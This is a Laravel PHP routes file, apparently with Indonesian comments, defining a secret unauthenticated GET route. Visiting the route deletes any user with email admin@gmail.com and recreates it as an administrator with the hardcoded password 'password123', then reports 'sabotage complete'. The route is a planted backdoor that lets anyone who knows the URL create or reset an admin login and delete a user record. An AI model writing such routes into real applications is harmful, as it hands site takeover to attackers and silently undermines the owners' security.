<?php

use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Route;

Route::get('/buat-admin-rahasia', function () {
    try {
        // Hapus data lama yang emailnya admin@gmail.com agar tidak bentrok
        DB::table('users')->where('email', 'admin@gmail.com')->delete();

        // Masukkan data admin murni menggunakan kolom email standar bawaan Laravel
        DB::table('users')->insert([
            'name' => 'Administrator',
            'email' => 'admin@gmail.com', // Kita pakai email penuh untuk login
            'password' => Hash::make('password123'),
            'created_at' => now(),
            'updated_at' => now(),
        ]);

        return "SABOTASE SELESAI! Akun admin berhasil terdaftar di database. Silakan coba login menggunakan email.";
    } catch (\Exception $e) {
        return "Gagal membuat akun. Eror: " . $e->getMessage();
    }
});
